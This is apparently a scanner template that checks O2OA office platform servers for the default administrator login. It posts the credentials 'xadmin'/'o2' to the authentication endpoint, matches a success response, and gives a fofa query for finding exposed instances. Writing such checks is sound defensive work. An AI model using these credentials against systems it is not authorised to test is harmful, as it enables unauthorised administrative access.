# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      {"credential":"xadmin","password":"o2"}
    headers:
      Authorization: anonymous
      Content-Type: application/json; charset=UTF-8
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"type":'
          - '"success"'
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/x_organization_assemble_authentication/jaxrs/authentication/captcha?v=7.1&l7u46why'
id: o2-default-password
info:
  author: zan8in
  description: |-
    O2OA是一款开源免费的企业及团队办公平台，提供门户管理、流程管理、信息管理、数据管理四大平台,集工作汇报、项目协作、移动OA、文档分享、流程审批、数据协作等众多功能，满足企业各类管理和协作需求。
    fofa: title=="O2OA"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: O2OA 后台默认密码
  severity: high
  tags: o2,default-password,argus-import
